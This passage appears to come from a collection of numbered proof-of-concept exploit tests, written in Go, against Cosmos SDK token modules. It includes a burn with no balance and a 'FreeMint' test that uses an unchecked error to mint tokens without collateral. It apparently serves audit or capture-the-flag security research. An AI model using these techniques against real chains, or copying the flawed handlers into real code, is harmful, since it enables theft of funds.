	paramstypes "github.com/cosmos/cosmos-sdk/x/params/types"
	"github.com/strangelove-ventures/hero/x/tokenfactory/keeper"
	"github.com/strangelove-ventures/hero/x/tokenfactory/types"
	"github.com/stretchr/testify/require"
	"github.com/tendermint/tendermint/libs/log"
	tmproto "github.com/tendermint/tendermint/proto/tendermint/types"
	dbm "github.com/tendermint/tm-db"
)

func tokenfactoryKeeperWithBank(t testing.TB) (*keeper.Keeper, bankkeeper.BaseKeeper, sdk.Context) {
	storeKey := sdk.NewKVStoreKey(types.StoreKey)
	memStoreKey := storetypes.NewMemoryStoreKey(types.MemStoreKey)
	bankStoreKey := sdk.NewKVStoreKey(banktypes.StoreKey)
	authStoreKey := sdk.NewKVStoreKey(authtypes.StoreKey)
	paramsStoreKey := sdk.NewKVStoreKey(paramstypes.StoreKey)
	paramsTStoreKey := storetypes.NewTransientStoreKey(paramstypes.TStoreKey)

	db := dbm.NewMemDB()
	stateStore := store.NewCommitMultiStore(db)
	stateStore.MountStoreWithDB(storeKey, sdk.StoreTypeIAVL, db)
	stateStore.MountStoreWithDB(memStoreKey, sdk.StoreTypeMemory, nil)
	stateStore.MountStoreWithDB(bankStoreKey, sdk.StoreTypeIAVL, db)
	stateStore.MountStoreWithDB(authStoreKey, sdk.StoreTypeIAVL, db)
	stateStore.MountStoreWithDB(paramsStoreKey, sdk.StoreTypeIAVL, db)
	stateStore.MountStoreWithDB(paramsTStoreKey, sdk.StoreTypeTransient, db)
	require.NoError(t, stateStore.LoadLatestVersion())

	registry := codectypes.NewInterfaceRegistry()
	authtypes.RegisterInterfaces(registry)
	cdc := codec.NewProtoCodec(registry)

	maccPerms := map[string][]string{types.ModuleName: {authtypes.Minter, authtypes.Burner}}

	paramsKeeper := paramskeeper.NewKeeper(cdc, codec.NewLegacyAmino(), paramsStoreKey, paramsTStoreKey)
	accountKeeper := authkeeper.NewAccountKeeper(cdc, authStoreKey, paramsKeeper.Subspace(authtypes.ModuleName), authtypes.ProtoBaseAccount, maccPerms)
	bankKeeper := bankkeeper.NewBaseKeeper(cdc, bankStoreKey, accountKeeper, paramsKeeper.Subspace(banktypes.ModuleName), make(map[string]bool))

	k := keeper.NewKeeper(cdc, storeKey, memStoreKey, paramsKeeper.Subspace(types.ModuleName), bankKeeper)

	ctx := sdk.NewContext(stateStore, tmproto.Header{}, false, log.NewNopLogger())
	k.SetParams(ctx, types.DefaultParams())

	return k, bankKeeper, ctx
}

func TestMsgServer_Burn_NoBalanceStillBurns(t *testing.T) {
	k, bankKeeper, ctx := tokenfactoryKeeperWithBank(t)
	msgServer := keeper.NewMsgServerImpl(*k)

	const denom = "uusdc"
	bankKeeper.SetDenomMetaData(ctx, banktypes.Metadata{
		DenomUnits: []*banktypes.DenomUnit{{Denom: denom, Exponent: 0}},
		Base:       denom,
		Display:    denom,
	})
	k.SetMintingDenom(ctx, types.MintingDenom{Denom: denom})
	k.SetPaused(ctx, types.Paused{Paused: false})

	attacker := sdk.AccAddress(ed25519.GenPrivKey().PubKey().Address().Bytes())
	k.SetMinters(ctx, types.Minters{Address: attacker.String(), Allowance: sdk.NewCoin(denom, sdk.NewInt(1_000_000))})

	burnAmt := sdk.NewInt(1000)
	require.NoError(t, bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(sdk.NewCoin(denom, burnAmt))))

	resp, err := msgServer.Burn(sdk.WrapSDKContext(ctx), types.NewMsgBurn(attacker.String(), sdk.NewCoin(denom, burnAmt)))

	require.NoError(t, err)
	require.NotNil(t, resp)
	require.True(t, bankKeeper.GetBalance(ctx, attacker, denom).IsZero())
	require.True(t, bankKeeper.GetSupply(ctx, denom).IsZero())
}
```

### PoC #61: HalbornSecurity
x/hal/keeper/msg_server_mint_hal_test.go
```golang
package keeper_test

import (
	"testing"

	"cosmossdk.io/log"
	math "cosmossdk.io/math"
	"cosmossdk.io/store"
	"cosmossdk.io/store/metrics"
	storetypes "cosmossdk.io/store/types"
	cmtproto "github.com/cometbft/cometbft/proto/tendermint/types"
	dbm "github.com/cosmos/cosmos-db"
	addresscodec "github.com/cosmos/cosmos-sdk/codec/address"
	"github.com/cosmos/cosmos-sdk/runtime"
	sdk "github.com/cosmos/cosmos-sdk/types"
	moduletestutil "github.com/cosmos/cosmos-sdk/types/module/testutil"
	auth "github.com/cosmos/cosmos-sdk/x/auth"
	authkeeper "github.com/cosmos/cosmos-sdk/x/auth/keeper"
	authtypes "github.com/cosmos/cosmos-sdk/x/auth/types"
	bank "github.com/cosmos/cosmos-sdk/x/bank"
	bankkeeper "github.com/cosmos/cosmos-sdk/x/bank/keeper"
	banktypes "github.com/cosmos/cosmos-sdk/x/bank/types"
	govtypes "github.com/cosmos/cosmos-sdk/x/gov/types"
	"github.com/stretchr/testify/require"

	"HalbornCTF/testutil/sample"
	"HalbornCTF/x/hal/keeper"
	"HalbornCTF/x/hal/types"
)

func setupMintHalKeeper(t testing.TB) (keeper.Keeper, authkeeper.AccountKeeper, bankkeeper.Keeper, sdk.Context) {
	encCfg := moduletestutil.MakeTestEncodingConfig(auth.AppModuleBasic{}, bank.AppModuleBasic{})
	cdc := encCfg.Codec

	halKey := storetypes.NewKVStoreKey(types.StoreKey)
	authKey := storetypes.NewKVStoreKey(authtypes.StoreKey)
	bankKey := storetypes.NewKVStoreKey(banktypes.StoreKey)

	db := dbm.NewMemDB()
	stateStore := store.NewCommitMultiStore(db, log.NewNopLogger(), metrics.NewNoOpMetrics())
	stateStore.MountStoreWithDB(halKey, storetypes.StoreTypeIAVL, db)
	stateStore.MountStoreWithDB(authKey, storetypes.StoreTypeIAVL, db)
	stateStore.MountStoreWithDB(bankKey, storetypes.StoreTypeIAVL, db)
	require.NoError(t, stateStore.LoadLatestVersion())

	ctx := sdk.NewContext(stateStore, cmtproto.Header{}, false, log.NewNopLogger())
	authority := authtypes.NewModuleAddress(govtypes.ModuleName).String()

	maccPerms := map[string][]string{
		types.ModuleName:         {authtypes.Minter, authtypes.Burner, authtypes.Staking},
		types.CollateralPoolName: {authtypes.Minter, authtypes.Burner},
		types.RedeemPoolName:     {authtypes.Minter, authtypes.Burner},
	}
	prefix := sdk.GetConfig().GetBech32AccountAddrPrefix()

	accountKeeper := authkeeper.NewAccountKeeper(cdc, runtime.NewKVStoreService(authKey),
		authtypes.ProtoBaseAccount, maccPerms, addresscodec.NewBech32Codec(prefix), prefix, authority)

	bankKeeper := bankkeeper.NewBaseKeeper(cdc, runtime.NewKVStoreService(bankKey),
		accountKeeper, map[string]bool{}, authority, log.NewNopLogger())

	k := keeper.NewKeeper(cdc, runtime.NewKVStoreService(halKey),
		log.NewNopLogger(), authority, accountKeeper, bankKeeper)

	require.NoError(t, k.SetParams(ctx, types.DefaultParams()))

	return k, accountKeeper, bankKeeper, ctx
}

func TestMintHalUncheckedError_FreeMint(t *testing.T) {
	k, accountKeeper, bankKeeper, ctx := setupMintHalKeeper(t)
	msgServer := keeper.NewMsgServerImpl(k)

	creator := sample.AccAddress()
	accAddr, err := sdk.AccAddressFromBech32(creator)
	require.NoError(t, err)

	params := types.DefaultParams()
	collateralDenom := params.CollateralMetas.Denom
	halDenom := params.HalMeta.Denom

	require.True(t, bankKeeper.GetBalance(ctx, accAddr, collateralDenom).IsZero())

	resp, err := msgServer.MintHal(sdk.WrapSDKContext(ctx), &types.MsgMintHal{
		Creator:          creator,
		CollateralAmount: sdk.NewCoin(collateralDenom, math.NewInt(100)),
	})
	require.NoError(t, err)

	require.Equal(t, math.NewInt(200), resp.MintedAmount.Amount)
	require.Equal(t, math.NewInt(200), bankKeeper.GetBalance(ctx, accAddr, halDenom).Amount)
	require.True(t, bankKeeper.GetBalance(ctx, accAddr, collateralDenom).IsZero())

	poolAddr := accountKeeper.GetModuleAddress(types.CollateralPoolName)
	require.True(t, bankKeeper.GetBalance(ctx, poolAddr, collateralDenom).IsZero())
}
```